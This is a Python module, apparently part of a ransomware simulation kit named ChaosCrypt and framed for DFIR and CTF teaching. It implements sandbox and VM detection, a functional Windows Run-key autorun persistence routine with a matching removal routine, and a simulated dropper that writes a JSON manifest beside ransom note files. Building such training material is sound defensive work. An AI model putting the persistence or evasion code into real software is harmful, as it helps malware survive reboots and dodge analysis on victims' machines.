import os
import sys
import time
import platform
import json

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    LOG_DIR, ROOT_DIR, LOGFILES, RANSOM_NOTE_NAME, RANSOM_QR_NAME
)

try:
    import winreg
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False

AUTO_RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
SANDBOX_INDICATORS = [
    r"C:\Program Files\VMware", r"C:\Program Files\VirtualBox",
    r"C:\Program Files\QV", r"C:\Program Files\Sandboxie", "Wine", "QEMU", "Vbox"
]

def wow_sandbox_detect(logger=None):
    """
    Визначає чи середовище sandbox/VM. Логує результат для DFIR (logger якщо є).
    """
    verdict = []
    for indicator in SANDBOX_INDICATORS:
        if os.path.exists(indicator) or indicator.lower() in platform.platform().lower():
            verdict.append(indicator)
    if "VBOX" in os.environ or "VMWARE" in os.environ:
        verdict.append(os.environ.get("VBOX", "") or os.environ.get("VMWARE", ""))
    if logger:
        logger.log_event("detection", "Sandbox detection check", metadata={"indicators": verdict, "platform": platform.platform()})
    return verdict

def wow_add_autorun_entry(exename, entry_name="ChaosCryptAgent", logger=None):
    """
    Додає себе/інший exe до автозапуску (WinReg only!).
    """
    if not IS_WINDOWS:
        if logger: logger.log_event("chaos", "Autorun set skipped: not Windows")
        return False
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key = winreg.OpenKey(reg, AUTO_RUN_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, exename)
        winreg.CloseKey(key)
        if logger: logger.log_event("infection", "Autorun registry entry added", metadata={"name": entry_name, "exe": exename})
        return True
    except Exception as e:
        if logger: logger.log_event("error", f"Failed to set autorun: {e}", metadata={"entry": entry_name, "exe": exename})
        return False

def wow_remove_autorun_entry(entry_name="ChaosCryptAgent", logger=None):
    """
    Видаляє запис з автозапуску (BlueTeam remediation!).
    """
    if not IS_WINDOWS:
        if logger: logger.log_event("remediation", "Autorun remove skipped: not Windows")
        return False
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key = winreg.OpenKey(reg, AUTO_RUN_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, entry_name)
        winreg.CloseKey(key)
        if logger: logger.log_event("remediation", "Autorun registry entry removed", metadata={"name": entry_name})
        return True
    except Exception as e:
        if logger: logger.log_event("error", f"Failed to remove autorun: {e}", metadata={"entry": entry_name})
        return False

def wow_dropper_manifest(drop_path, phase_name, drop_files=None, drop_message="WOW Infection Dropper active!", logger=None):
    """
    Симулює dropper — створює маніфест-файл (для teach/DFIR)
    """
    try:
        manifest = {
            "manifest_time": int(time.time()),
            "phase": phase_name,
            "dropped_files": drop_files or [],
            "message": drop_message,
            "host": platform.node(),
            "sandbox_verdict": wow_sandbox_detect(),
        }
        mf_path = os.path.join(drop_path, f"wow_dropper_{phase_name}_{int(time.time())}.json")
        with open(mf_path, "w", encoding="utf-8") as f:
            json.dump(manifest, f, ensure_ascii=False, indent=2)
        if logger: logger.log_event("infection", "Dropper manifest dropped", metadata={"path": mf_path, "manifest": manifest})
        return mf_path
    except Exception as e:
        if logger: logger.log_event("error", f"Failed to write dropper manifest: {e}", metadata={"phase": phase_name})
        return None

def wow_infection_simulation(target_dir, logger=None):
    """
    Симулює підкидання артефактів/файлів для wow-teach/CTF.
    """
    try:
        note_path = os.path.join(target_dir, RANSOM_NOTE_NAME)
        qr_path = os.path.join(target_dir, RANSOM_QR_NAME)
        dropped_files = []
        if os.path.exists(note_path):
            dropped_files.append(note_path)
        if os.path.exists(qr_path):
            dropped_files.append(qr_path)
        mf = wow_dropper_manifest(
            target_dir, "infection", drop_files=dropped_files,
            drop_message="Ransom artifacts dropped! DFIR-trigger event.", logger=logger)
        return mf, dropped_files
    except Exception as e:
        if logger: logger.log_event("error", f"Failed wow_infection_simulation: {e}", metadata={"dir": target_dir})
        return None, []

if __name__ == "__main__":
    print("*** ChaosCrypt system_hooks (Diamond teach/BlueTeam/RedTeam) ***")
    # WOW: тест логування, створюємо логер phase із show
    from chaoscrypt.logbook import LogBook
    logger = LogBook(phase="show")
    # Sandbox/VM detection
    verdict = wow_sandbox_detect(logger=logger)
    print("Sandbox indicators detected:", verdict)
    # Автозапуск+dropper тест (тільки на Windows)
    if IS_WINDOWS:
        exe = sys.executable
        wow_add_autorun_entry(exe, entry_name="ChaosCryptAgent", logger=logger)
        time.sleep(0.5)
        wow_remove_autorun_entry(entry_name="ChaosCryptAgent", logger=logger)
    # Dropper infection simulation (Target_Show)
    mf, files = wow_infection_simulation(os.path.join(ROOT_DIR,"Target_Show"), logger=logger)
    print("Dropper Manifest:", mf)
    print("Dropped Files:", files)
    logger.log_event("info", "System_hooks demo executed", metadata={"sandbox": verdict})
